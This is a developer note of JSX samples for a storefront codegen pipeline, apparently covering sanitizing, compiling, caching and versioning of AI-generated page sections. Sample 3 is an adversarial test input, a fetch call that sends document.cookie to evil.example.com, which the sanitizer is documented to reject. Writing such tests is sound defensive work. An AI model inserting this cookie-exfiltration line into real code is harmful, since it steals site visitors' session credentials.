# Codegen dogfood

Hand-rolled JSX samples that exercise the Phase-2 pipeline end-to-end.
Each is valid source the AI is expected to emit in Phase 3.

## Sample 1 — reduction-to-slot-tree path

```jsx
<Motion enter="slide-up" hover="lift">
  <Overlay anchor="bottom-right" offset_x={24} offset_y={24}>
    <Button content="Pesan Sekarang" href="/menu" size="md" />
  </Overlay>
</Motion>
```

- Pure primitive composition, no hooks, literal props only.
- `sanitizeJsx` returns `kind: 'slot_tree'`.
- Live renderer calls `SlotRenderer` with the returned `SlotNode`.
- No MDX compile runs.

## Sample 2 — compile path

```jsx
function Section() {
  const [liked, setLiked] = useState(false);
  return (
    <Stack direction="col" gap={8}>
      <Text content="Signature dish" />
      <Button content={liked ? "Diingat" : "Simpan"} href="/menu" />
    </Stack>
  );
}
```

- Uses `useState` → `sanitizeJsx` returns `kind: 'compile'`.
- `compileSection` hands the wrapped MDX source to `@mdx-js/mdx` with
  `outputFormat: 'function-body'`.
- Measured on dev hardware: ~23 ms, ~660 bytes of `compiled_code`.
- L2 cache (storefront_compile_cache) is keyed by sha256(source +
  sanitizer_v + compiler_v) — second compile of the same source
  returns in <1 ms from memory.

## Sample 3 — adversarial (should be rejected)

```jsx
<Motion>
  {fetch('https://evil.example.com/steal?c=' + document.cookie)}
</Motion>
```

- `sanitizeJsx` throws `SanitizerError { rule: 'banned_global', path: '...' }`.
- `compileSection` returns `{ ok: false, stage: 'sanitizer', error }`.
- API route persists `compile_status='sanitizer_failed'`, leaves any
  previously-compiled code intact.
- The section continues rendering its prior working state (or the
  "sedang disiapkan" fallback if none).

## Sample 4 — corner-positioning with countdown

```jsx
<Motion enter="fade" enter_trigger="in-view-once">
  <Overlay anchor="bottom-right" offset_x={24} offset_y={24} z={30}>
    <Box padding={12} background="#CD7F32" border_radius={999}>
      <Countdown
        target_iso="2030-01-01T00:00:00Z"
        format="dhms"
        on_expire="show-expired-text"
        expired_text="Sudah ditutup"
      />
    </Box>
  </Overlay>
</Motion>
```

- Reduces to a slot tree (no hooks, all literal props).
- Live page ticks the countdown client-side via the Countdown primitive
  (it's the only client-component in the tree; the rest render RSC).

## How to run a sample locally

```bash
# Bare compile measurement (no DB write):
node scripts/sample-compile.mjs

# Full round-trip via the API (requires running dev server + owner session):
curl -X POST http://localhost:3000/api/sections/compile \
  -H 'Content-Type: application/json' \
  -H 'Cookie: <supabase auth cookies>' \
  -d '{"section_id":"<uuid>","source_jsx":"<Motion enter=\"fade\"><Text content=\"hi\"/></Motion>"}'

# Check what landed in the DB:
#   select type, compile_status, code_hash, length(compiled_code) as bytes
#   from storefront_sections where id='<uuid>';
```

## Versioning

Every successful compile bumps `storefront_sections.current_version_id`
via the trigger. `compiled_code`, `source_jsx`, `code_hash`, and
`compile_status` are mirrored to `storefront_section_versions` on the
way through, so `sajian_restore_section_version(section_id, N)` replays
version N's compile artifact without re-running the compiler.
